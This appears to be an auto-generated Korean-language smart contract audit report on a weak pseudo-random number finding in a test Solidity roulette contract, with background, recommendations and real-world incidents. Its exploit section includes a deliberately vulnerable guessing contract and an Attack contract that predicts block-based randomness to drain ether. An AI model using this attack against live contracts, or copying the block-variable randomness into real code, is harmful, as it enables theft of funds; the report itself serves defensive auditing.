<button class='date-button'>2023-11-25</button>

# Audit Report

> 🔍 `Filename`: /Users/sikk/Desktop/Antibug/SafeDevAnalyzer/test/prng/roulette.sol
---

[<button class='styled-button'>English</button>](roulette_en.md)
<br />


<style>
    .date-button{
        color:black;
        border:none;
        font-weight: bold;
        background-color: sand;
        width: 150px;
        height: 25px;
        float: right;
        border-radius: 20px;
    }
    .styled-button{
        color: black;
        border: none;
        font-weight: bold;
        background-color: lightskyblue;
        width: 100px;
        height: 30px;
        float: right;
        border-radius: 20px;
    }
    .styled-button:hover{
        color: black;
        border: none;
        font-weight: bold;
        background-color: pink;
        width: 100px;
        height: 30px;
        float: right;
        cursor: pointer;
    }
</style>

               
<details>
<summary style='font-size: 20px;'>weak-prng</summary>
<div markdown='1'>

## Detect Results

| Detector | Impact | Confidence | Info |
|:---:|:---:|:---:|:---:|
| weak-prng | <span style='color:lightcoral'> High </span> | <span style='color:olivedrab'> Medium </span> | guess 함수는 블록 변수를 이용하여 난수를 생성합니다. IF _guess == answer |||


<br />

## Vulnerabiltiy in code:

```solidity
line 5:     function guess(uint _guess) public {

```
 ---

 ```solidity
line 13:         if (_guess == answer) {

```
 ---

 <br />

## Background:


<details> 
    <summary style='font-size: 18px;color:pink;'> 💡 블록체인에서 Randomness란? </summary><br />
    
- Randomness는 `pseudo-randomness`와 `true-randomness`로 구분할 수 있습니다.

    - `pseudo-randomness`는 결정론적 알고리즘에 의해 생성되며, 초기 시드 값을 알고 있다면 예측할 수 있습니다.
    
    - `true-randomness`는 엔트로피 소스에 의존하고 있어, 예측 불가능한 랜덤 값을 생성합니다.

- 블록체인 네트워크의 노드는 다양한 알고리즘을 이용해 `pseudo-randomness`를 생성할 수 있으며, 복권 당첨자 선정, 보상 분배, 게임에서 NFT 토큰 아이템의 희귀도, 전리품 분배 등의 시나리오에서 난수를 사용합니다.
- 그러나 블록체인은 네트워크의 모든 노드가 동일한 결론에 도달하도록 보장하기 때문에, 동일한 입력이 주어지면 컨트랙트의 출력은 항상 동일하다는 특징이 있습니다.

</details>
<br />      
    

<br />

## Description:


블록체인에서는 완전한 난수를 생성할 수 없습니다.
완전한 난수가 생성되지 않는다는 것은 난수 생성에 대한 결과를 예측할 수 있어 조작을 할 수 있다는 것을 의미합니다.

완전한 난수는 `atmospheric noise`나 `user action` 등 예측할 수 없는 외부 요인에 의존해야 하지만, 스마트 컨트랙트는 이러한 요인에 직접적으로 접근할 수 없어 완전한 난수를 생성할 수 없습니다.

특히나, 스마트 컨트랙트는 개인키 생성 등 보안 메커니즘을 위해 사용하는 경우도 있으나, 공격자가 개인 키를 예측하여 계정이나 자금에 무단으로 액세스할 수도 있습니다.

블록체인에서 난수를 생성하는 방법은 크게 두 가지로 나눌 수 있습니다.

<details> 
    <summary style='font-size: 16px;color:skyblue;'> 1. 블록체인 네트워크의 노드가 생성한 난수를 사용하는 방법 </summary><br />
   
블록 변수에는 

|  |  |  |
---|---|---
`block.basefee(uint)`|`block.chainid(uint)`|`block.coinbase()`
`block.difficulty(uint)`|`block.gaslimit(uint)`|`block.number(uint)`
`block.timestamp(uint)`|`blockhash(uint)` 


등이 있으며,

이 중 `block.difficulty`, `blockhash`, `block.number`, `block.timestamp`가 난수 생성에 주로 활용됩니다.

[Solidity Docs](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties "Reference")

블록 데이터에 의해 생성되는 난수는 일반적인 사용자가 난수를 예측할 수 있는 가능성은 제한하지만, 악의적인 채굴자는 블록 데이터를 조작하여 난수를 조작할 수 있습니다.
블록 데이터는 한 블록에서 동일한 값을 갖고 있어, 같은 블록에서 난수를 생성하면 항상 동일한 결과를 얻을 수 있습니다.
</details>
<br />


<details> 
    <summary style='font-size: 16px;color:skyblue;'> 2. 외부 난수 생성기를 사용하는 방법 </summary><br />
   
블록체인 오라클에서 난수 시드를 생성할 수 있으며, 온체인 오라클을 사용해 오프체인 데이터를 온체인에서 얻을 수 있습니다.

API 데이터와 같은 외부 randomness 소스를 가져와 컨트랙트 동작에 영향을 줄 수 있어 블록체인 변수를 사용해 난수를 생성하는 것보다 예측 불가능성을 높일 수 있지만, 오라클에 대한 신뢰도 문제가 발생할 수 있습니다.

</details>
<br />

    

<br />

## Recommendation:


- `block.hash`, `block.timestamp`를 난수 생성을 위한 소스로 사용하지 않는 것이 좋습니다.
- 참가자가 미리 값을 commit하고, 모든 commit이 제출된 후 실제 값이 공개되는 방식(`Commit-Reveal Schemes`)으로 난수를 생성하는 것이 좋습니다.
- 여러 입력을 활용해 난수를 생성하는 탈중앙화 솔루션인 `Chainlink VRF(Verifiable Random Function)`를 활용하는 것이 좋습니다.
- 하드웨어 난수 생성기(RNG)를 사용해 공격자가 예측할 수 없는 무작위 값 생성하는 것이 좋습니다.  
    

<br />

## Exploit scenario:


```solidity
contract GuessTheRandomNumber {
    constructor() payable {}
    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
 
        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
 }
 ```
 
- 이전 블록의 `blockhash`와 `block.timestamp`을 난수 시드로 결합하여 업데이트 하는 방식으로 난수를 생성하고 있습니다.
- 사용자가 추측한 숫자가 생성된 숫자와 일치하면 `1 ether`를 획득하게 되는 컨트랙트이며, 무작위성이 도입된 것으로 보이지만 조작이 가능합니다.

```solidity
contract Attack {
    receive() external payable {}

    unction attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
 
        guessTheRandomNumber.guess(answer);
    }
 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
 }
 ```    
 
- 공격자는 `GuessTheRandomNumber` 컨트랙트의 주소를 전달해 deploy 하여 `Attack` 컨트랙트를 생성합니다.
- attack 함수에서는 GuessTheRandomNumber 컨트랙트의 guess 로직을 동일하게 구현하여, 이전 블록의 `blockhash`와 `block.timestamp`을 난수 시드로 결합하여 업데이트 하는 방식으로 난수를 생성합니다.
- `GuessTheRandomNumber` 컨트랙트의 `guess` 함수가 동일한 블록에서 실행되면 `block.number`와 `block.timestamp`는 변경되지 않기 때문에 동일한 난수를 생성할 수 있게 되어, 공격자는 `1 ether`를 획득할 수 있습니다.  
    

<br />

## Real World Examples:


1. `SmartBillions ICO (2017)`: SmartBillions는 이더리움 기반의 로또 플랫폼으로, 공격자가 로또 게임 결과를 조작하여 상금 획득할 수 있었습니다.
    https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85
    https://www.reddit.com/r/ethereum/comments/74d3dc/smartbillions_lottery_contract_just_got_hacked/   
     
2. `Fomo3D (2018)`: Fomo3D는 이더리움 스마트 컨트랙트 기반의 게임으로, 공격자가 게임 결과를 조작하여 상금을 획득할 수 있었습니다.
    https://etherscan.io/address/0xa62142888aba8370742be823c1782d17a0389da1
    https://medium.com/@zhongqiangc/randomness-in-smart-contracts-is-predictable-and-vulnerable-fomo3d-part-1-4d500c628191
    

<br />

## Reference:


- https://www.slowmist.com/articles/solidity-security/Common-Vulnerabilities-in-Solidity-Randomness.html
- https://medium.com/@solidity101/100daysofsolidity-072-source-of-randomness-in-solidity-smart-contracts-ensuring-security-and-7af014bfac22
- https://dev.to/natachi/attack-vectors-in-solidity-09-bad-randomness-also-known-as-the-nothing-is-secret-attack-ca9
- https://medium.com/rektify-ai/bad-randomness-in-solidity-8b0e4a393858
    

</details>

